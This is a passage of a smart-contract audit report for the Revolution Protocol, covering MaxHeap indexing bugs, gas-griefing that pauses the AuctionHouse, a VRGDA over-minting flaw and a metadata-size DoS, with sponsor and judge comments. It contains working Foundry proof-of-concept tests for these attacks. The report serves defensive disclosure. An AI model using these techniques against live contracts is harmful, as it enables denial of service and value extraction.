*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/363).*


**Some points to note about this issue:**

1.  The downward heapifying issue has been demonstrated to display an additional impact to the already existing impact of incorrect indexing and max heap tree spec violation.
2.  Although downward heapifying does not work in the codebase currently since downvoting does not exist, it can be introduced in the future based on sponsor's comments (see below). This would break the protocol functionality as demonstrated in this issue. This is because the data structure can change its admin to a future CultureIndex contract that supports downvoting but the CultureIndex cannot start using a new data structure since the max heap has existing data stored in it.
3.  Even if there is no concept of downvoting, MaxHeap is expected to fully implement the maxHeap spec and functionality requirements (see below), which it does not implement correctly.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/363).*

### Recommended Mitigation Steps

The most straightforward solution to this would be to consider this type of case in the [extractMax()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L156) function itself.

The following check ensures that if the last element is equal to the parent and it is greater than equal to the right index of the root node (i.e. index 2), we update the positionMapping correctly to 0. This check needs to be placed after [this statement](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L160).

```solidity
if (heap[size] == parent(size) && heap[size] >= heap[2]) {
    positionMapping[heap[0]] = 0;
}
```

**[rocketman-21 (Revolution) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/363#issuecomment-1885810158):**
 > Not updating the `positionMapping` after extract max was an oversight on my end, I think this is legit.
> 
> New extract max:
> 
> ```
>     /// @notice Extract the maximum element from the heap
>     /// @dev The function will revert if the heap is empty
>     /// The values for the popped node are removed from the items mapping
>     /// @return The maximum element from the heap
>     function extractMax() external onlyAdmin returns (uint256, uint256) {
>         if (size == 0) revert EMPTY_HEAP();
> 
>         // itemId of the node with the max value at the root of the heap
>         uint256 popped = heap[0];
> 
>         // get priority value of the popped node
>         uint256 returnValue = items[popped].value;
> 
>         // remove popped node values from the items mapping for the popped node
>         delete items[popped];
> 
>         // set the root node to the farthest leaf node and decrement the size
>         heap[0] = heap[--size];
> 
>         // update the heap index for the previously farthest leaf node
>         items[heap[0]].heapIndex = 0;
> 
>         //delete the farthest leaf node
>         delete heap[size];
> 
>         //maintain heap property
>         maxHeapify(0);
> 
>         return (popped, returnValue);
>     }
> ```
> 
> https://github.com/collectivexyz/revolution-protocol/blob/941719c8f3c168d6d53e38528336ec6cf5df17c5/packages/revolution/src/culture-index/MaxHeap.sol#L187

**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/363#issuecomment-1887545762):**
Although I acknowledge that this is a good and severe find, any PoC so far was only focused on `MaxHeap` itself and not its current usage through the main entry points of the protocol. Therefore, Medium severity seems appropriate since further impacts on the main functionality of the protocol need to be proven.

_Note: See full discussion [here](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/363)._

***

## [[M-08] MaxHeap.sol: Already extracted tokenId may be extracted again](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/266)
*Submitted by [DanielArmstrong](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/266), also found by [pep7siup](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/499), [mojito\_auditor](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/444), [MrPotatoMagic](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/403), [nmirchev8](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/391), [0xDING99YA](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/386), [SpicyMeatball](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/95), and [bart1e](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/41)*

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/MaxHeap.sol#L102> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/MaxHeap.sol#L156>

`MaxHeap.sol#extractMax` function only decreases the `size` variable without initializing the `heap` state variable.
On the other hand, `MaxHeap.sol#maxHeapify` function involves the `heap` variable for the out-of-bound index which will contain dirty non-zero value.
As a result, uncleared dirty value of `heap` state variable will be used in the process and already extracted tokenId will be extracted again.

### Proof of Concept

`MaxHeap.sol#extractMax` function is following.

```solidity
File: MaxHeap.sol
156:     function extractMax() external onlyAdmin returns (uint256, uint256) {
157:         require(size > 0, "Heap is empty");
158: 
159:         uint256 popped = heap[0];
160:         heap[0] = heap[--size];
161:         maxHeapify(0);
162: 
163:         return (popped, valueMapping[popped]);
164:     }
```

As can be seen, the above funcion decreases `size` state variable by one, but does not initialize the `heap[size]` value to zero.
In the meantime,`MaxHeap.sol#maxHeapify` function is following.

```solidity
File: MaxHeap.sol
094:     function maxHeapify(uint256 pos) internal {
095:         uint256 left = 2 * pos + 1;
096:         uint256 right = 2 * pos + 2;
097: 
098:         uint256 posValue = valueMapping[heap[pos]];
099:         uint256 leftValue = valueMapping[heap[left]];
100:         uint256 rightValue = valueMapping[heap[right]];
101: 
102:         if (pos >= (size / 2) && pos <= size) return;
103: 
104:         if (posValue < leftValue || posValue < rightValue) {
105:             if (leftValue > rightValue) {
106:                 swap(pos, left);
107:                 maxHeapify(left);
108:             } else {
109:                 swap(pos, right);
110:                 maxHeapify(right);
111:             }
112:         }
113:     }
```

For example, if `size=2` and `pos=0`, `right = 2 = size` holds true.
So the `heap[right]=heap[size]` indicates the value of out-of-bound index which may be not initialized in `extractMax` function ahead.
But in `L102` since `pos = 0 < (size / 2) = 1` holds true, the function does not return and continue to proceed the below section of function.
Thus, abnormal phenomena occurs due to the value that should not be used.

We can verify the above issue by adding and running the following test code to `test/max-heap/Updates.t.sol`.

```solidity
    function testExtractUpdateError() public {
        // Insert 3 items with value 20 and remove them all
        maxHeapTester.insert(1, 20);
        maxHeapTester.insert(2, 20);
        maxHeapTester.insert(3, 20);

        maxHeapTester.extractMax();
        maxHeapTester.extractMax();
        maxHeapTester.extractMax(); // Because all of 3 items are removed, itemId=1,2,3 should never be extracted after.

        // Insert 2 items with value 10 which is small than 20
        maxHeapTester.insert(4, 10);
        maxHeapTester.insert(5, 10);
        // Update value to cause maxHeapify
        maxHeapTester.updateValue(4, 5);

        // Now the item should be itemId=5, value=10
        // But in fact the max item is itemId=3, value=20 now.
        (uint256 itemId, uint256 value) = maxHeapTester.extractMax(); // itemId=3 will be extracted again

        require(itemId == 5, "Item ID should be 5 but 3 now");
        require(value == 10, "value should be 10 but 20 now");
    }
```

As a result of test code, the return value of the last `extractMax` call is not `(itemId, value) = (5, 10)` but `(itemId, value) = (3, 20)` which is error.
According to `READM.md#L313`, the above result must not be forbidden.

### Recommended Mitigation Steps

Modify the `MaxHeap.sol#extractMax` function as follows:

```solidity
    function extractMax() external onlyAdmin returns (uint256, uint256) {
        require(size > 0, "Heap is empty");

        uint256 popped = heap[0];
        heap[0] = heap[--size];
 ++     heap[size] = 0;
        maxHeapify(0);

        return (popped, valueMapping[popped]);
    }
```

Since the value of `heap[size]` is initialized to zero, no errors will occur even though the value of out-of-bound index is used in `maxHeapify` function.

**[rocketman-21 (Revolution) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/266#issuecomment-1877704894):**
 > Think this should be medium, it requires that we make the values of the maxheap less than they were inserted at, which isn't possible in CultureIndex (which is upvote only)

**[0xTheC0der (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/266#issuecomment-1885934024):**
> I judged this contest with a strict baseline for Medium severity findings.
> However, I was "forced" to accept a view-only ERC-721 violation as valid Medium due to historical precedence on C4.
> As the present issue is similarly deviating from spec without severe impacts on the functionality of the protocol at its current state, it seems fair and consistent to move forward with Medium severity and therefore appropriately value the effort behind uncovering this very valid bug.

_Note: For full discussion see [here](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/266)_

***

## [[M-09] Anyone can pause AuctionHouse in `_createAuction`](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/195)
*Submitted by [bart1e](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/195), also found by [wintermute](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/619), [Tricko](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/607), [0xDING99YA](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/576), Ryonen ([1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/394), [2](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/390)), [00xSEV](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/382), and [hals](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/679)*

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/AuctionHouse.sol#L328> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/AuctionHouse.sol#L311-L313> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/VerbsToken.sol#L292-L310>

Any user can call `AuctionHouse::settleCurrentAndCreateNewAuction` in order to settle the old auction and create a new one. `settleCurrentAndCreateNewAuction` will call `_createAuction`, which code is shown below:

```solidity
    function _createAuction() internal {
        // Check if there's enough gas to safely execute token.mint() and subsequent operations
        require(gasleft() >= MIN_TOKEN_MINT_GAS_THRESHOLD, "Insufficient gas for creating auction");


        try verbs.mint() returns (uint256 verbId) {
            uint256 startTime = block.timestamp;
            uint256 endTime = startTime + duration;


            auction = Auction({
                verbId: verbId,
                amount: 0,
                startTime: startTime,
                endTime: endTime,
                bidder: payable(0),
                settled: false
            });


            emit AuctionCreated(verbId, startTime, endTime);
        } catch {
            _pause();
        }
    }
```

As we can see, it will try to mint an NFT, but if it fails, it will execute the `catch` clause. Sponsors are already aware that `catch` block would also catch deliberate Out Of Gas exceptions and that is why `require(gasleft() >= MIN_TOKEN_MINT_GAS_THRESHOLD)` is present in the code (`MIN_TOKEN_MINT_GAS_THRESHOLD = 750_000`). However, it is still possible to consume a lot of gas in `verbs.mint` and force the `catch` clause to execute, and, in turn, pause the contract.

In order to see it, let's look at the code of `VerbsToken::mint`:

```solidity
    function mint() public override onlyMinter nonReentrant returns (uint256) {
        return _mintTo(minter);
    }
```

It will call `_mintTo`:

```solidity
    function _mintTo(address to) internal returns (uint256) {
       [...]
        // Use try/catch to handle potential failure
        try cultureIndex.dropTopVotedPiece() returns (ICultureIndex.ArtPiece memory _artPiece) {
            artPiece = _artPiece;
            uint256 verbId = _currentVerbId++;


            ICultureIndex.ArtPiece storage newPiece = artPieces[verbId];


            newPiece.pieceId = artPiece.pieceId;
            newPiece.metadata = artPiece.metadata;
            newPiece.isDropped = artPiece.isDropped;
            newPiece.sponsor = artPiece.sponsor;
            newPiece.totalERC20Supply = artPiece.totalERC20Supply;
            newPiece.quorumVotes = artPiece.quorumVotes;
            newPiece.totalVotesSupply = artPiece.totalVotesSupply;


            for (uint i = 0; i < artPiece.creators.length; i++) {
                newPiece.creators.push(artPiece.creators[i]);
            }


            _mint(to, verbId);


            [...]
    }
```

As can be seen, it performs some costly operations in terms of gas:

*   `cultureIndex.dropTopVotedPiece()` may be costly if there are many art pieces in the `MaxHeap` - height of `MaxHeap` is `O(log n)`, where `n` is the number of elements, but `dropTopVotedPiece` may iterate over the entire height and each time it will read and write storage memory, which is expensive.
*   `newPiece.metadata = artPiece.metadata;` can be very costly when `artPiece.metadata` is big (currently, it can have an arbitrary size, so this operation may be very costly).
*   `newPiece.creators.push(artPiece.creators[i]);` is writing to `storage` in a loop, which is expensive as well.

Although all above mentioned operations could be used in order to cause OOG exception, I will focus only on the third one - as I will show in the PoC section, if `10` creators are specified (which is a reasonable number) and even a small art piece (containing only a short URL and short description), the attack is possible as `push`es will consume over `750 000` gas. It shows that the attack can be performed very often - probably in case of majority of auctions that are ready to be started (as many of art pieces will have several creators or slightly longer descriptions).

### Impact

Malicious users will be able to often pause the `AuctionHouse` contract - they don't even need for their art piece to win the voting as the attack will be likely possible even on random art pieces.

Of course, the owner (DAO) will still be able to unpause the contract, but until it does so (the proposal would have to be first created and voted, which takes time), the contract will be paused and impossible to use. The upgrade of `AuctionHouse` contract will be necessary in order to recover.

### Proof of Concept

The test below demonstrates how an attacker can cause `_createAuction` to execute `catch` clause causing `AuctionHouse` to pause itself when it shouldn't as there is another art piece waiting to be auctioned.

Please put the following test into `AuctionSettling.t.sol` and run it:

<details>

```solidity
    // create an auction with a piece of art with given number of creators and finish it
    function _createAndFinishAuction() internal
    {
        uint nCreators = 10;
        address[] memory creatorAddresses = new address[](nCreators);
        uint256[] memory creatorBps = new uint256[](nCreators);
        uint256 totalBps = 0;
        address[] memory creators = new address[](nCreators + 1);
        for (uint i = 0; i < nCreators + 1; i++)
        {
            creators[i] = address(uint160(0x1234 + i));
        }

        for (uint256 i = 0; i < nCreators; i++) {
            creatorAddresses[i] = address(creators[i]);
            if (i == nCreators - 1) {
                creatorBps[i] = 10_000 - totalBps;
            } else {
                creatorBps[i] = (10_000) / (nCreators - 1);
            }
            totalBps += creatorBps[i];
        }

        // create the initial art piece
        uint256 verbId = createArtPieceMultiCreator(
            "Multi Creator Art",
            "An art piece with multiple creators", 
            ICultureIndex.MediaType.IMAGE,
            "ipfs://multi-creator-art",
            "",
            "",
            creatorAddresses,
            creatorBps
        );

        vm.startPrank(auction.owner());
        auction.unpause();
        vm.stopPrank();

        uint256 bidAmount = auction.reservePrice();
        vm.deal(address(creators[nCreators]), bidAmount + 1 ether);
        vm.startPrank(address(creators[nCreators]));
        auction.createBid{ value: bidAmount }(verbId, address(creators[nCreators]));
        vm.stopPrank();

        vm.warp(block.timestamp + auction.duration() + 1); // Fast forward time to end the auction

        // create another art piece so that it's possible to create next auction
        createArtPieceMultiCreator(
            "Multi Creator Art",
            "An art piece with multiple creators", 
            ICultureIndex.MediaType.IMAGE,
            "ipfs://multi-creator-art",
            "",
            "",
            creatorAddresses,
            creatorBps
        );
    }

    function testDOS4() public
    {
        vm.startPrank(cultureIndex.owner());
        cultureIndex._setQuorumVotesBPS(0);
        vm.stopPrank();

        _createAndFinishAuction();

        assert(auction.paused() == false);
        // 2 900 000 will be enough to perform the attack
        auction.settleCurrentAndCreateNewAuction{ gas: 2_900_000 }();
        assert(auction.paused());
    }
```
</details>

### Tools Used

VS Code

### Recommended Mitigation Steps

Preventing OOG with `MIN_TOKEN_MINT_GAS_THRESHOLD` will not work as, I have shown before, there are at least `3` ways for attackers to boost the amount of gas used in `VerbsToken::mint`.

In order to fix the issue, consider changing `catch` to `catch Error(string memory)` that will not catch OOG exceptions.

**[rocketman-21 (Revolution) confirmed](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/195#issuecomment-1876096461)**

**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/195#issuecomment-1879684718):**
 > Warden identified 3 main gas griefing attack vectors:
> > As can be seen, it performs some costly operations in terms of gas:
> > 
> > * `cultureIndex.dropTopVotedPiece()` may be costly if there are many art pieces in the `MaxHeap` - height of `MaxHeap` is `O(log n)`, where `n` is the number of elements, but `dropTopVotedPiece` may iterate over the entire height and each time it will read and write storage memory, which is expensive
> > * `newPiece.metadata = artPiece.metadata;` can be very costly when `artPiece.metadata` is big (currently, it can have an arbitrary size, so this operation may be very costly)
> > * `newPiece.creators.push(artPiece.creators[i]);` is writing to `storage` in a loop, which is expensive as well
> > 
> > Although all above mentioned operations could be used in order to cause OOG exception, ...
> 
> With a subsequent impact of pausing the `AuctionHouse`.
> 
> Issues which partially identified the underlying core issues will be awarded partial credit.

> After reviewing comments and (former) duplicates, I agree with this the most:
> > * Pausing `AuctionHouse` by deliberately causing OOG exception.
> > * DoSing `AuctionHouse` by specifying many creators (possibly with griefing `receive` functions).
> > * DoSing `AuctionHouse` by creating art piece with heavy metadata.
> 
> All those vulnerabilities have different core issues which require different mitigation steps. Therefore de-duplicated accordingly.

_Note: See full discussion [here](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/195)._

***

## [[M-10] `ERC20TokenEmitter::buyToken` function mints more tokens to users than it should do](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/194)
*Submitted by [osmanozdemir1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/194), also found by [rouhsamad](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/600), [KupiaSec](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/464), [deepplus](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/419), [BARW](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/405), [0xDING99YA](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/360), [bart1e](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/315), [SpicyMeatball](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/241), [DanielArmstrong](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/237), [haxatron](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/209), [Brenzee](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/62), and [rvierdiiev](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/25)*

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/ERC20TokenEmitter.sol#L180> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/ERC20TokenEmitter.sol#L184> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/ERC20TokenEmitter.sol#L200-L215>

Users can buy governance tokens with the `ERC20TokenEmitter::buyToken()` function. In this protocol, governance token prices are determined by a linear [VRGDA](https://www.paradigm.xyz/2022/08/vrgda) calculation. The token price increases if the token supply is ahead of the schedule and decreases if it is behind the schedule.

There are also some other parameters I need to mention, which are [`creatorRateBps`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/ERC20TokenEmitter.sol#L42) and [`entropyRateBps`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/ERC20TokenEmitter.sol#L45).

*   **creatorRateBps:** The portion that goes to the creator anytime a token is bought.

*   **entropyRateBps:** The portion of the creator's cut that is paid directly as ETH. The remaining part of the creator's cut is used to buy governance tokens for the creator.

For example, if the creator rate is 10%, the entropy rate is 50%, and a user wants to buy 100 ETH worth of tokens:\
\- Creator cut is 10 ETH\
\- 5 ETH will be sent directly to the creator\
\- The other 5 ETH will be used to buy governance tokens for the creator.\
\- The user will get 90 ETH worth of governance tokens.

This is the main logic in the `ERC20TokenEmitter` contract.

Now, let's examine the `buyToken` function:\
<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/ERC20TokenEmitter.sol#L152C3-L230C6>

```solidity
    function buyToken(
        address[] calldata addresses,
        uint[] calldata basisPointSplits,
        ProtocolRewardAddresses calldata protocolRewardsRecipients
    ) public payable nonReentrant whenNotPaused returns (uint256 tokensSoldWad) {
        // ... some code

        // Get value left after protocol rewards
        uint256 msgValueRemaining = _handleRewardsAndGetValueToSend(
            msg.value,
            protocolRewardsRecipients.builder,
            protocolRewardsRecipients.purchaseReferral,
            protocolRewardsRecipients.deployer
        );

        //Share of purchase amount to send to treasury
173.    uint256 toPayTreasury = (msgValueRemaining * (10_000 - creatorRateBps)) / 10_000;

        //Share of purchase amount to reserve for creators
        //Ether directly sent to creators
177.    uint256 creatorDirectPayment = ((msgValueRemaining - toPayTreasury) * entropyRateBps) / 10_000;
        //Tokens to emit to creators
179.      int totalTokensForCreators = ((msgValueRemaining - toPayTreasury) - creatorDirectPayment) > 0
180.-->     ? getTokenQuoteForEther((msgValueRemaining - toPayTreasury) - creatorDirectPayment)
            : int(0);

        // Tokens to emit to buyers
184.--> int totalTokensForBuyers = toPayTreasury > 0 ? getTokenQuoteForEther(toPayTreasury) : int(0); //@audit-issue tokensForCreators and tokensForBuyers are calculated separately based on their proportional ether payments. This breaks VRGDA logic because these separate calculation are both made according to the current token supply. These two calculations should not be independent of each other

        //Transfer ETH to treasury and update emitted
        emittedTokenWad += totalTokensForBuyers;
        if (totalTokensForCreators > 0) emittedTokenWad += totalTokensForCreators;

        //... rest of the code
        // funds are transferred and these amounts are minted.
    }
```

This function:

1.  Calculates buyers' ETH share in line 173.

2.  Calculates direct ETH payment to creators in line 177.

3.  Calculates token amount to mint for creators with the remaining ETH after direct payment in lines 179-180 using `getTokenQuoteForEther` function.

4.  Calculates token amount to mint for buyers in line 184 using `getTokenQuoteForEther` function

5.  After all of these calculations, it updates `emittedTokenWad` parameter.

Now let's check the [`getTokenQuoteForEther`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/ERC20TokenEmitter.sol#L254C2-L264C6) function:

```solidity
    function getTokenQuoteForEther(uint256 etherAmount) public view returns (int gainedX) {
        //...
        return
            vrgdac.yToX({
                timeSinceStart: toDaysWadUnsafe(block.timestamp - startTime),
-->             sold: emittedTokenWad, //@audit it uses current state variable
                amount: int(etherAmount)
            });
    }
```

As we can see in this function, how many governance tokens will be minted is calculated according to the current supply, which is `emittedTokenWad` parameter.

**Alright, what is the issue?**

The issue is that both of the `totalTokensForCreators` and `totalTokensForBuyers` parameters are **separately** calculated like they are independent of each other, and the `emittedTokenWad` is updated after that. However, this situation breaks the VRGDA logic and more tokens are minted for the same amount of ETH.

These two calculations should not be independent. Total governance tokens to mint for the total ETH payment should be calculated first, and then the governance token amounts should be proportionally distributed.

Calculating proportional ETH amounts for the buyer and the creator first, and then determining the corresponding governance tokens to mint separately, leads to a higher total number of governance tokens to be minted compared to calculating the total governance tokens required based on the overall ETH amounts to be paid.

### Impact

*   Protocol mints more governance tokens are minted than it should be.

### Proof of Concept

**Coded PoC**

Down below you can find a basic PoC that proves calculating tokens to mint separately results in many more tokens than calculating it only once with total payment.

You can use the protocol's own setup to run this PoC\
\-Copy and paste the snippet into the `ERC20TokenEmitter.t.sol` test file\
\-Run it with `forge test --match-test testTokenQuoteForEther_is1plus1equal2 -vvv`

```solidity
    function testTokenQuoteForEther_is1plus1equal2() public {
        int256 tokenToGetFor100ether = erc20TokenEmitter.getTokenQuoteForEther(100e18);
        int256 tokenToGetFor500ether = erc20TokenEmitter.getTokenQuoteForEther(500e18);
        int256 tokenToGetFor600ether = erc20TokenEmitter.getTokenQuoteForEther(600e18);

        // Calculating mint amounts separately will result in minting much more tokens.
        assertGt(tokenToGetFor100ether + tokenToGetFor500ether, tokenToGetFor600ether);
        console2.log("current total: ", tokenToGetFor100ether + tokenToGetFor500ether);
        console2.log("supposed total: ", tokenToGetFor600ether);
    }
```

Results after running:

```solidity
Running 1 test for test/token-emitter/ERC20TokenEmitter.t.sol:ERC20TokenEmitterTest
[PASS] testTokenQuoteForEther_is1plus1equal2() (gas: 41635)
Logs:
  current total:  586751802158813828000
  supposed total:  581798293495083372000

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 41.60ms.
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests).
```

### Tools Used

Foundry

### Recommended Mitigation Steps

There are two ways to resolve this issue. An unfair but much easier one, and the fair but not that easy one

**Unfair One:**\
The protocol team should decide which side (creators or buyers) will suffer from the unfairness, and update the `emittedTokenWad` in the middle of two calculations. The latter calculation will buy tokens at a higher price.

In the example below, the change is in favour of the creators. Buyers get tokens with updated prices to keep the VRGDA logic intact.

```diff
        //Tokens to emit to creators
        int totalTokensForCreators = ((msgValueRemaining - toPayTreasury) - creatorDirectPayment) > 0
            ? getTokenQuoteForEther((msgValueRemaining - toPayTreasury) - creatorDirectPayment)
            : int(0);

+       // Moving this here will keep the VRGDA logic intact, and the calculation for buyers will be made with updated token supply.
+       if (totalTokensForCreators > 0) emittedTokenWad += totalTokensForCreators;
        
        // Tokens to emit to buyers
        int totalTokensForBuyers = toPayTreasury > 0 ? getTokenQuoteForEther(toPayTreasury) : int(0);

        //Transfer ETH to treasury and update emitted
        emittedTokenWad += totalTokensForBuyers;
-       if (totalTokensForCreators > 0) emittedTokenWad += totalTokensForCreators;
```

**Fair One:**\
This one requires a little more work but it is more fair. The function should:

1.  Calculate the total ETH payment (creators + buyers) for the governance token purchase.

2.  Calculate how many total governance tokens will be minted with this total ETH payment

3.  Then mint proportional amounts to buyers and creators.

**Example**:

```solidity
// Note: This is not diff. It is just an example

// Creators ETH payment for purchase
uint256 creatorsPayment = (msgValueRemaining - toPayTreasury) - creatorDirectPayment)

// Total ETH payment for purchase (toPayTreasury is already buyers payment)
uint256 totalPayment = toPayTreasury + creatorsPayment;

// Get total governance tokens to mint
int totalGovernanceTokenAmount = getTokenQuoteForEther(totalPayment);

// Calculate proportional governance token amounts.
// Note: I didn't check this for rounding. Care should be taken if this method will be implemented
int totalTokensForCreators = (totalGovernanceTokenAmount * creatorsPayment) / totalPayment;
int totalTokensForBuyers = (totalGovernanceTokenAmount * toPayTreasury) / totalPayment;
```

**[rocketman-21 (Revolution) confirmed](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/194#issuecomment-1876087797)**

***

## [[M-11] Since art pieces' size is not limited, attacker may block AuctionHouse from creating and settling auctions](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/178)
*Submitted by [bart1e](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/178), also found by [KingNFT](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/75) and [nmirchev8](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/183)*

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/AuctionHouse.sol#L370-L371> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/AuctionHouse.sol#L385> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/CultureIndex.sol#L209-L238> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/AuctionHouse.sol#L313> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/VerbsToken.sol#L178> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/VerbsToken.sol#L282> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/VerbsToken.sol#L296-L308>

**Note:** *there is another bug (calling `verbs.getArtPieceById` in a loop in `_settleAuction`), but this issue focuses on a different attack vector for creating DoS attack, so in this submission, I assume that the bug is fixed (that is, `verbs.getArtPieceById` is not called in a loop, but cached before it).*

### Brief Description

This submission shows two implications of the same bug - not limiting length of pieces of art in `CultureIndex::createPiece`:

*   `_settleAuction` may be caused to consume a lot of gas, or even to fail because block gas limit will be reached
*   `_createAuction` may be caused to revert for some amount of time, blocking the entire `AuctionHouse`

### Detailed description

`CultureIndex::createPiece` allows any user to create art pieces. The only validation regarding art piece size performed there is the validation in `validateMediaType` which only ensures that relevant field in art piece is non-zero.

If an art piece wins voting, its data is then fetched several times (`3` - see  note at the beginning of this submission) when `verbs.getArtPieceById` is called.

If malicious creator creates some nice art piece (for instance of type `IMAGE`) and hides a very long string in another, irrelevant field (such as `ArtPieceMetadata.text`) and his piece wins the voting, **it will cost a lot of gas to fetch its data both in `_settleAuction` and `_createAuction`**.

The following implications may occur:

1.  It may either cause a user who calls `_settleAuction` to pay a lot for gas, or possibly even DoS the entire `AuctionHouse`.
2.  `_createAuction` may be DoSed, and, as a result, the entire `AuctionHouse` may be DoSed, at least until another piece of art wins voting.

### Impact

1.  Users may pay very high fees for gas (see the exact gas amounts in the PoC section). In the worst case `AuctionHouse` will be DoSed as `_settleAuction` will attempt to consume more than the block gas limit (`30 000 000`). According to the calculations I have made (see PoC), it's currently possible to cause `_settleAuction` to use up to `~22 000 000` gas, which is currently less than the block gas limit of `30 000 000`. However, operations costs were changing in the past - for example the cost of `sload` (that is used when art piece's data is fetched) increased from `50` to `2100` (or `100` in case of warm access) from the frontier hardfork (see [frontier](https://ethereum.github.io/execution-specs/autoapi/ethereum/frontier/vm/gas/index.html?gas-sload#gas-sload) and [shanghai](https://ethereum.github.io/execution-specs/autoapi/ethereum/shanghai/vm/gas/index.html?gas-cold-sload#gas-cold-sload)), so it is possible that after another hardfork, it will be possible to DoS `AuctionHouse` using this exploit. Moreover, it is possible that block gas limit will decrease, which will cause the same effect.
2.  `_createAuction` will reach block gas limit, which will make creating new auctions impossible, until another art piece wins voting (but the "malicious" art piece will still participate in subsequent votings).

